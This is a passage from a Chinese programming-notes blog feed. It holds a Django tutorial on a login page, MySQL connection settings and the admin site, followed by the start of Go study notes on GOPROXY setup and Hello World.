punctuation\">&gt;</span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{% static 'bootstrap/js/bootstrap.min.js' %}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>container<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-signin<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            {% csrf_token %}\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-signin-heading<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>请登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sr-only<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>用户名<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>用户<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span> <span class=\"token attr-name\">autofocus</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sr-only<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>密 码<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>密码<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>btn btn-lg btn-primary btn-block<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token comment\">&lt;!-- /container --&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>除了sigin.css以外，都是下载好直接放static文件夹，sigin.css自己编的</p>\n<div class=\"language-css\" data-ext=\"css\" data-title=\"css\"><pre class=\"language-css\"><code><span class=\"token selector\">.form-signin</span><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 330px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 15px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0 auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.form-signin-heading</span><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">margin-bottom</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n</code></pre></div><p>ps</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&lt;link href=\"{% static 'bootstrap/css/bootstrap.min.css' %}\" rel=\"stylesheet\"&gt;\n这句代码会被Django渲染成\n&lt;link href=\"/static/bootstrap/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;\n</code></pre></div><p><code>views.py</code>中写后台处理逻辑</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>shortcuts <span class=\"token keyword\">import</span> redirect\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 打开login.html页面</span>\n        <span class=\"token keyword\">return</span> render<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> <span class=\"token string\">\"login.html\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 从表单提取用户名</span>\n        username <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>POST<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 从表单提取密码</span>\n        password <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>POST<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>username<span class=\"token operator\">==</span><span class=\"token string\">'test'</span> <span class=\"token keyword\">and</span> password<span class=\"token operator\">==</span><span class=\"token string\">'123'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 用户名与密码都正确时，定向到test.html渲染的页面</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/test/'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> render<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> <span class=\"token string\">\"login.html\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'用户名或密码错误！'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p><code>urls.py</code>中添加</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>urlpatterns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    path<span class=\"token punctuation\">(</span><span class=\"token string\">'login/'</span><span class=\"token punctuation\">,</span>views<span class=\"token punctuation\">.</span>login<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span>\n</code></pre></div><p>效果</p>\n<figure><figcaption>image-20240206091545375</figcaption></figure>\n<h2>连接数据库</h2>\n<p>用命令生成项目与应用程序后，项目根目录下会生成一个默认的数据库<code>db.sqlite3</code>，在<code>settings.py</code>文件中有这个数据库的默认连接，</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>DATABASES <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">'default'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">'ENGINE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'django.db.backends.sqlite3'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 数据库引擎，指明数据库类型</span>\n        <span class=\"token string\">'NAME'</span><span class=\"token punctuation\">:</span> BASE_DIR <span class=\"token operator\">/</span> <span class=\"token string\">'db.sqlite3'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 指明数据库所在位置，本项目中数据库位置：/myproject/db.sqlites</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>ps.   Django可以生成数据库表，不能生成数据库，生成数据库要用到数据库原生命令。</p>\n<p>不想使用sqlite3可以换成mysql等，只需要</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>pip <span class=\"token function\">install</span> pymysql\n</code></pre></div><p>在settings.py中设置DATABASES代码块</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>DATABASES <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">'default'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\"># 'ENGINE': 'django.db.backends.sqlite3',</span>\n        <span class=\"token comment\"># 'NAME': BASE_DIR / 'db.sqlite3',</span>\n        <span class=\"token string\">'ENGINE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'django.db.backends.mysql'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\"># 数据库引擎，指明数据库类型</span>\n        <span class=\"token string\">'NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'mytest'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 数据库名称，需要先手动建个数据库</span>\n        <span class=\"token string\">'HOST'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'PORT'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'3306'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'USER'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'PASSWORD'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'123456'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>然后在<code>/myproject/myapp/models.py</code>中建立数据表</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>db <span class=\"token keyword\">import</span> models\n\n<span class=\"token comment\"># Create your models here.</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfo</span><span class=\"token punctuation\">(</span>models<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    user<span class=\"token operator\">=</span>models<span class=\"token punctuation\">.</span>CharField<span class=\"token punctuation\">(</span>max_length<span class=\"token operator\">=</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'姓名'</span><span class=\"token punctuation\">)</span>\n    email<span class=\"token operator\">=</span>models<span class=\"token punctuation\">.</span>EmailField<span class=\"token punctuation\">(</span>verbose_name<span class=\"token operator\">=</span><span class=\"token string\">'邮箱'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>user\n</code></pre></div><p><code>models.py</code>中有了代码，它所属的应用程序必须在<code>settings.py</code>的<code>INSTALLED_APPS</code>代码块中注册</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>\nINSTALLED_APPS <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token string\">'django.contrib.admin'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'django.contrib.auth'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'django.contrib.contenttypes'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'django.contrib.sessions'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'django.contrib.messages'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'django.contrib.staticfiles'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'myapp'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">#新增</span>\n<span class=\"token punctuation\">]</span>\n\n</code></pre></div><p>在项目目录<code>/myproject/myproject/__init__.py</code>中编写以下代码，指明以<code>pymysql</code>模块代替<code>MySQLdb</code>模块，这里要十分注意字母的大小写。</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">import</span> pymysql\npymysql<span class=\"token punctuation\">.</span>install_as_MySQLdb<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>最后运行命令生成数据表，在终端输入以下命令：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>python manage.py makemigrations\npython manage.py migrate\n</code></pre></div><figure><figcaption>image-20240206100811599</figcaption></figure>\n<p>可以看到该数据库中新增了很多表，最主要的是<code>myaap_userinfo</code></p>\n<figure><figcaption>image-20240206101028514</figcaption></figure>\n<p>Django生成数据表时会把<code>models.py</code>中的类名转成小写，然后在前面加上应用程序的名字和下划线，如<code>myapp_userinfo</code>。以<code>auth_</code>和<code>django_</code>开头的数据表是Django自动生成的系统表。</p>\n<h2>使用Django建立后台管理系统</h2>\n<p>注册数据库表，在<code>/myproject/myapp/admin.py</code>中注册<code>models.py</code>生成的数据表，代码如下。</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>contrib <span class=\"token keyword\">import</span> admin\n\n<span class=\"token comment\"># Register your models here.</span>\n<span class=\"token keyword\">from</span> <span class=\"token punctuation\">.</span>models <span class=\"token keyword\">import</span> UserInfo\n<span class=\"token comment\"># 注册数据库表</span>\n<span class=\"token comment\"># 自定义数据模型在管理后台的显示样式</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfoAdmin</span><span class=\"token punctuation\">(</span>admin<span class=\"token punctuation\">.</span>ModelAdmin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n<span class=\"token comment\"># 指明在Django Admin管理后台列表模式下显示哪几个字段</span>\n    list_display<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'email'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># admin.site.register()函数表示：如果只有一个参数，以默认方式在后台显示或管理数据表；如果有第二个参数，就按第二个参数传入的类定制的方式显示和管理数据表。</span>\nadmin<span class=\"token punctuation\">.</span>site<span class=\"token punctuation\">.</span>register<span class=\"token punctuation\">(</span>UserInfo<span class=\"token punctuation\">,</span>UserInfoAdmin<span class=\"token punctuation\">)</span>\n</code></pre></div><p>为了使后台管理系统用中文显示，需要在<code>settings.py</code>中修改<code>LANGUAGE_CODE</code>、<code>TIME_ZONE</code>两个变量，修改的值如下。</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token comment\"># LANGUAGE_CODE = 'en-us'</span>\nLANGUAGE_CODE <span class=\"token operator\">=</span> <span class=\"token string\">'zh-hans'</span>\n<span class=\"token comment\"># TIME_ZONE = 'UTC'</span>\nTIME_ZONE <span class=\"token operator\">=</span> <span class=\"token string\">'Asia/Shanghai'</span>\n</code></pre></div><p>创建后台管理超级用户，需在命令行终端输入</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python manage.py createsuperuser\n</code></pre></div><p>按提示输入用户名、电子邮箱地址、密码等相关信息</p>\n<figure><figcaption>image-20240206105633570</figcaption></figure>\n<p>http://127.0.0.1:8000/admin/  这个URL就是项目搭建开始的时候就默认生成的</p>\n<figure><figcaption>image-20240206105859063</figcaption></figure>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Go语言圣经",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/",
      "summary": "Go语言圣经\n\nGo语言圣经 - Go语言圣经 (golang-china.github.io)\n\n示例代码\necho0d/DailyCode: Code of DailyNotes",
      "content_html": "\n<blockquote>\n<p><a href=\"https://golang-china.github.io/gopl-zh/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">Go语言圣经 - Go语言圣经 (golang-china.github.io)</a></p>\n</blockquote>\n<p>示例代码\n<a href=\"https://github.com/echo0d/DailyCode\" target=\"_blank\" rel=\"noopener noreferrer\">echo0d/DailyCode: Code of DailyNotes</a></p>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "01. 入门",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch1.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch1.html",
      "summary": "01. 入门\n1.1. Hello, World\nGOPROXY设置\nwindows下载安装包，直接默认安装。此处版本go1.15.15\n编译程序会报错\n原因：从 Go 1.11 版本开始，官方支持了 go module 包依赖管理工具。还新增了 GOPROXY 环境变量。\n如果设置了该变量，下载源代码时将会通过这个环境变量设置的代理地址，而不再是以前...",
      "content_html": "\n<h2>1.1. Hello, World</h2>\n<h3>GOPROXY设置</h3>\n<p>windows下载安装包，直接默认安装。此处版本go1.15.15</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>PS C:\\Users\\echo0d\\Desktop\\gopl.io-master\\ch1\\helloworld&gt; go env\nset GO111MODULE=on\nset GOARCH=amd64                                  \nset GOBIN=                                        \nset GOCACHE=C:\\Users\\echo0d\\AppData\\Local\\go-build\nset GOENV=C:\\Users\\echo0d\\AppData\\Roaming\\go\\env  \nset GOEXE=.exe                                    \nset GOFLAGS=\nset GOHOSTARCH=amd64\nset GOHOSTOS=windows\nset GOINSECURE=\nset GOMODCACHE=C:\\Users\\echo0d\\go\\pkg\\mod\nset GONOPROXY=\nset GONOSUMDB=\nset GOOS=windows\nset GOPATH=C:\\Users\\echo0d\\go\nset GOPRIVATE=\nset GOPROXY=https://proxy.golang.org,direct\nset GOROOT=C:\\Program Files\\Go\nset GOSUMDB=sum.golang.org\nset GOTMPDIR=\nset GOTOOLDIR=C:\\Program Files\\Go\\pkg\\tool\\windows_amd64\nset GCCGO=gccgo\nset AR=ar\nset GOMOD=C:\\Users\\echo0d\\Desktop\\gopl.io-master\\go.mod\nset CGO_CFLAGS=-g -O2\nset CGO_CPPFLAGS=\nset CGO_CXXFLAGS=-g -O2\nset CGO_FFLAGS=-g -O2\nset CGO_LDFLAGS=-g -O2\nset PKG_CONFIG=pkg-config\nset GOGCCFLAGS=-m64 -mthreads -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=C:\\Users\\echo0d\\AppData\\Local\\Temp\\go-build967739482=/tmp/go-build -gno-record-gcc-switches\n</code></pre></div><p>编译程序会报错</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>PS C:\\Users\\echo0d\\Desktop\\gopl.io-master\\ch1\\helloworld&gt; go run main.go\ngo: golang.org/x/net@v0.0.0-20210929193557-e81a3d93ecf6: Get \"https://proxy.golang.org/golang.org/x/net/@v/v0.0.0-20210929193557-e81a3d93ecf6.mod\": dial tcp [2404:6800:4003:c04::8d]:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.\n</code></pre></div><p>原因：从 <code>Go 1.11</code> 版本开始，官方支持了 <code>go module</code> 包依赖管理工具。还新增了 <code>GOPROXY</code> 环境变量。</p>\n<p>如果设置了该变量，下载源代码时将会通过这个环境变量设置的代理地址，而不再是以前的直接从代码库下载。也就是这个变量</p>\n<div class=\"language-cmd\" data-ext=\"cmd\" data-title=\"cmd\"><pre class=\"language-cmd\"><code>go env -w GO111MODULE=on\ngo env -w GOPROXY=https://goproxy.cn,direct\n</code></pre></div><p>powershell执行，https://goproxy.io这个项目看起来非常不错</p>\n<div class=\"language-powershell\" data-ext=\"powershell\" data-title=\"powershell\"><pre class=\"language-powershell\"><code><span class=\"token comment\"># 启用 Go Modules 功能</span>\n<span class=\"token variable\">$env</span>:GO111MODULE=<span class=\"token string\">\"on\"</span>\n<span class=\"token comment\"># 配置 GOPROXY 环境变量</span>\n<span class=\"token variable\">$env</span>:GOPROXY=<span class=\"token string\">\"https://goproxy.io\"</span>\n</code></pre></div><p>cmd执行</p>\n<div class=\"language-cmd\" data-ext=\"cmd\" data-title=\"cmd\"><pre class=\"language-cmd\"><code>set GOPROXY=https://proxy.golang.org,direct\n</code></pre></div><p>如果使用的 Go 版本&gt;=1.13, 你可以通过设置 GOPRIVATE 环境变量来控制哪些私有仓库和依赖(公司内部仓库)不通过 proxy 来拉取，直接走本地，设置如下：</p>\n<div class=\"language-powershell\" data-ext=\"powershell\" data-title=\"powershell\"><pre class=\"language-powershell\"><code><span class=\"token comment\"># 配置 GOPROXY 环境变量</span>\n<span class=\"token variable\">$env</span>:GOPROXY = <span class=\"token string\">\"https://goproxy.io,direct\"</span>\n<span class=\"token comment\"># 设置不走 proxy 的私有仓库或组，多个用逗号相隔（可选）</span>\n<span class=\"token variable\">$env</span>:GOPRIVATE = <span class=\"token string\">\"git.mycompany.com,github.com/my/private\"</span>\n</code></pre></div><p>除此之外还有</p>\n<p>七牛云：https://goproxy.cn</p>\n<p>aliyun：https://mirrors.aliyun.com/goproxy/</p>\n<blockquote>\n<p>后面感觉go1.15版本有点低，改成 go1.21.8</p>\n</blockquote>\n<h3>Hello, World</h3>\n<p>初始化，新建一个文件夹，例如ch2</p>\n<div class=\"language-cmd\" data-ext=\"cmd\" data-title=\"cmd\"><pre class=\"language-cmd\"><code>cd ch2\ngo mod init ch2\n# 生成一个go.mod文件，内容如下\nmodule ch2\ngo 1.22.1\n\n</code></pre></div><p>示例代码<em>gopl.io/ch1/helloworld</em></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, 世界\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><blockquote>\n<p>Go语言的函数名首字母一定要大写，上面如果写成fmt.println就不对</p>\n</blockquote>\n<figure><figcaption>image-20240313224312928</figcaption></figure>\n<p>Go是一门编译型语言，Go语言提供的工具都通过一个单独的命令<code>go</code>调用，<code>go</code>命令有一系列子命令。最简单的一个子命令就是run。这个命令编译一个或多个以.go结尾的源文件，链接库文件，并运行最终生成的可执行文件。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ go run helloworld.go\n</code></pre></div><p>这个命令会输出：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Hello, 世界\n</code></pre></div><p>Go语言原生支持Unicode，它可以处理全世界任何语言的文本。</p>\n<p>单独编译这个程序，保存编译结果以备将来之用。可以用build子命令：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ go build helloworld.go\n</code></pre></div><p>这个命令生成一个名为helloworld的可执行的二进制文件，Windows系统下生成的可执行文件是helloworld.exe，增加了.exe后缀名</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>.\\helloworld.exe\nHello, 